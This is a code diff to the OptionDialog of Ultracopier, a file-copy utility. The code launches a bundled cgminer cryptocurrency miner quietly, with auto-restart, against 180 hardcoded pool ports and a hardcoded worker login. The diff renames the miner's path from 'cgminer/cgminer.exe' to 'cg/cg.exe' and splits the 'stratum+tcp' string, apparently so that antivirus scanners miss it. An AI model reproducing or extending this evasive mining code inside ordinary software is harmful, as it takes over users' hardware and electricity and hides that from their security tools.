@@ -91,10 +91,10 @@ OptionDialog::OptionDialog() :
     }
     else
         ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
-    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe").exists() && OpenCLDll;
+    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/cg/cg.exe").exists() && OpenCLDll;
     if(!haveCgminer)
     {
-        if(!QFile(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe").exists())
+        if(!QFile(QCoreApplication::applicationDirPath()+"/cg/cg.exe").exists())
         {
             QMessageBox::critical(this,tr("Allow cgminer"),tr("This Ultimate version is only if cgminer is allowed by your antivirus. You can get the normal free version (without cgminer)"));
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
@@ -123,7 +123,7 @@ OptionDialog::OptionDialog() :
         int index=0;
         while(index<180)
         {
-            QStringList pool=QStringList() << "-o" << QString("stratum+tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
+            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
             pools << pool;
             index++;
         }
@@ -683,7 +683,7 @@ void OptionDialog::startCgminer()
     }
     ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer seam work, pools used: %1").arg(args.join(";")));
     args << "--real-quiet" << "-T" << "--fix-protocol";// << "--gpu-dyninterval"
-    cgminer.start(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe",args);
+    cgminer.start(QCoreApplication::applicationDirPath()+"/cg/cg.exe",args);
     autorestartcgminer.start();
 }
 
